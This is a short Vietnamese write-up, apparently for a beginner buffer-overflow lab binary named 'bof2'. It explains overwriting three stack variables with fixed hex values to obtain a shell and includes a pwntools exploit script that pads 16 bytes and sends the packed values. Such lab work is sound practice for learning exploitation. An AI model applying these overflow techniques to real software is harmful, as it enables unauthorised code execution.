![image](https://github.com/user-attachments/assets/ef49143f-58f8-4174-bbf4-f4549dc850d7)
* Cũng như Buffer_Overflow_1.md nhưng ở đây v5,v6,v7 phải giống các kí tự hex như thế chương trình sẽ tạo cho mình shell đấy là mục tiêu của mình.
* Và các kí tự HEX này cũng không phải là kí tự trên bàm phím nên chúng ta sẽ không nhập vào được
* Do đó trong trường hợp này chúng ta phải viết tool.
* Đầu tiên tìm offset của v5,v6,v7.
![image](https://github.com/user-attachments/assets/7747bd8b-bdee-4a58-9385-a7c2e45bb630)
#### PAYLOAD
<pre>
  from pwn import *
  p = process('./bof2')
  
  payload = b'A'*16
  payload += p64(0xCAFEBABE)
  payload += p64(0xDEADBEEF)
  payload += p64(0x13371337)
  p.sendafter(b'> ',payload)
  
  p.interactive()
</pre>

* Chạy nó và ta có kết quả <br>
![image](https://github.com/user-attachments/assets/c94252a6-5cb8-4418-895e-ed34f590d5d5)
